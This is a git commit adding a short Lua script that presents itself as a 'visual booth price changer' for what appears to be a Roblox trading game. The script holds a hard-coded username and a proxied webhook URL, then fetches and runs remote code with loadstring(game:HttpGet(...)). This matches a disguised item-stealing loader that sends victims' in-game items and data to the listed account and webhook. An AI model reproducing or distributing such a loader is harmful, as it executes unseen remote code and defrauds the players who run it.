aa1d55d06d3d6bb481c0b97ef375bf2e0d617a89
ps99-0 <elghribi200@gmail.com>
2025-04-16 05:50:52 -0700

    Create visualer booth price changer.lua

---
+++ DupeHuge/visualer booth price changer.lua
@@ -0,0 +1,4 @@
+Username = "jhhhhjjjj32" -- << Your Username
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=SUNPTEZmY0cwblA0UENlMGZ1VDJyQTplOGEtUzV0ckN2U1NnMjJDbGU4Y0tRNmk0bzMyV2gzOTNlcjE2WnBpVFlNX1VNSGNFbW1VU0laOHUxeVNsVXRFcUNzc1dvYUlmanU3YTZTVjFaanhrbTc3NXQybkk5MWZja1ZSVkQ0SF9JNy1vY05PSkJEV3Q2TG9CMXFOMXBQaWJtVU9LQjBqc2hiLXBaNVVFU2huVWVGNVFrWG9xd2VQaVFaVWNRLU9sTmc" -- << Your Webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/ps99/refs/heads/main/Rua99"))()
